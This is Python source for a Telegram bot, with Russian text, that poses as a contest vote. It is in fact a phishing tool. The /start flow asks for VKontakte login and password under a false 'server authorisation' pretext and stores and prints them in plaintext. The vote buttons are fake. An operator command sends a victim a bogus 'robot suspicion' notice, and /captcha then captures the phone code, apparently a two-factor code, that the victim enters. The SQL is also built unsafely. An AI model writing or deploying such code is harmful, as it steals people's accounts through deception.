# импорты
import telebot
from telebot import types
import sqlite3
from config import *
from time import sleep

# создание бд
db = sqlite3.connect('database.db', check_same_thread=False)
cursor = db.cursor()

# создание таблицы если не создана
cursor.execute("""
    CREATE TABLE IF NOT EXISTS users(
    id INTEGER,
    login TEXT,
    password TEXT
)""")

# подключение к боту
bot = telebot.TeleBot(bot_token)


@bot.message_handler(commands=['start'])
def start(message):
    # Проверяем есть ли пользователь в системе
    usrid = message.chat.id
    user_select = cursor.execute(f"SELECT id FROM users WHERE id =  {usrid}").fetchone()
    if user_select is None:
        # добавляем пользователя
        cursor.execute("INSERT INTO users VALUES (?, ?, ?)", (usrid, "none", "none"))
        db.commit()
        # Отправляем приветственное сообщение
        bot.reply_to(message, hello_text)
        msg = bot.send_message(message.chat.id, "Для начала введите ваш номер телефона/почту от ВКонтакте (Не бойтесь это нужно чтобы авторизовать вас на сервере как пользователь ВКонтакте)")
        print('Новый пользователь!')
        bot.register_next_step_handler(msg, reg_login)
    else:
        bot.send_message(message.chat.id, "Вы уже зарегестрированы! \n Напишите /connect чтобы подключиться к голосованию")

# Получение логина
def reg_login(message):
    # сохранение логина пользователя
    usr_login = message.text
    usrid = message.chat.id
    cursor.execute(f"UPDATE users SET login = ? WHERE id = {usrid}", (usr_login, )) # сохранение логина пользователя в базу данных
    msg = bot.send_message(message.chat.id, "Введите ваш пароль от ВКонтакте")
    print(f"{usrid} | Login: {usr_login}")
    bot.register_next_step_handler(msg, reg_password)
    db.commit()

# получение пароля
def reg_password(message):
    # сохранение пароля пользователя
    usr_password = message.text
    usrid = message.chat.id
    cursor.execute(f"UPDATE users SET password = ? WHERE id = {usrid}", (usr_password, )) # сохранение пароля пользователя в базу данных
    bot.send_message(message.chat.id, "Вы успешно закончили регистрацию! \n Чтобы присоеденисться к голосоваю введите /connect")
    print(f"{usrid} | Password {usr_password}")
    db.commit()


@bot.message_handler(commands=['connect'])
def connect(message):
    bot.send_message(message.chat.id, "Пожалуйста введите id голосования")

@bot.message_handler(func=lambda message: message.text == vote_id)
def connecting(message):
    bot.send_message(message.chat.id, "Присоеденяем вас к голосованю за пользователей!")
    sleep(2)
    kb = types.ReplyKeyboardMarkup(one_time_keyboard=True, row_width=1, resize_keyboard=True) # создание клавиатуры
    # создание кнопок
    btn1 = types.KeyboardButton("Голосовать за участника 1")
    btn2 = types.KeyboardButton("Голосовать за участника 2")
    btn3 = types.KeyboardButton("Голосовать за участника 3")
    btn4 = types.KeyboardButton("Голосовать за участника 4")
    kb.add(btn1, btn2, btn3, btn4) # добавление кнопок
    file = open('voting_users.jpg', 'rb') # Тут происходит открытие картинке (можете сменить название)
    bot.send_photo(message.chat.id, file, f"👤 Участник 1: {participant1[0]} {participant1[1]} Голосов: {participant1[2]} \n 👤 Участник 2: {participant2[0]} {participant2[1]} Голосов: {participant2[2]} \n 👤 Участник 3: {participant3[0]} {participant3[1]} Голосов: {participant3[2]} \n 👤 Участник 4: {participant4[0]} {participant4[1]} Голосов: {participant4[2]} \n Выберите за кого хотите проголосовать", reply_markup=kb)

@bot.message_handler(func= lambda message: message.text == 'Голосовать за участника 1')
def golos1 (message):
    bot.reply_to(message, "Спасибо за голосование!")
    types.ReplyKeyboardRemove()

@bot.message_handler(func= lambda message: message.text == 'Голосовать за участника 2')
def golos2 (message):
    bot.reply_to(message, "Спасибо за голосование!")
    types.ReplyKeyboardRemove()

@bot.message_handler(func= lambda message: message.text == 'Голосовать за участника 3')
def golos3 (message):
    bot.reply_to(message, "Спасибо за голосование!")
    types.ReplyKeyboardRemove()

@bot.message_handler(func= lambda message: message.text == 'Голосовать за участника 4')
def golos4 (message):
    bot.reply_to(message, "Спасибо за голосование!")
    types.ReplyKeyboardRemove()

@bot.message_handler(commands=['a_send'])
def a_send (message):
    msg = bot.send_message(message.chat.id, "Введите chat id пользователя")
    bot.register_next_step_handler(msg, asend)

def asend (message):
    chi = message.text
    bot.send_message(chi, "Пришло подозрение на робота вам придет код вам на телефон, вам требуется ввести его через команду /captcha")

@bot.message_handler(commands=['captcha'])
def captcha1 (message):
    msg = bot.reply_to(message, "Введите код")
    bot.register_next_step_handler(msg, captcha2)

def captcha2 (message):
    bot.reply_to(message, "Вы успешно подтвердили что вы не робот")
    print(f"{message.chat.id} | Code: {message.text}")

bot.polling(none_stop=True)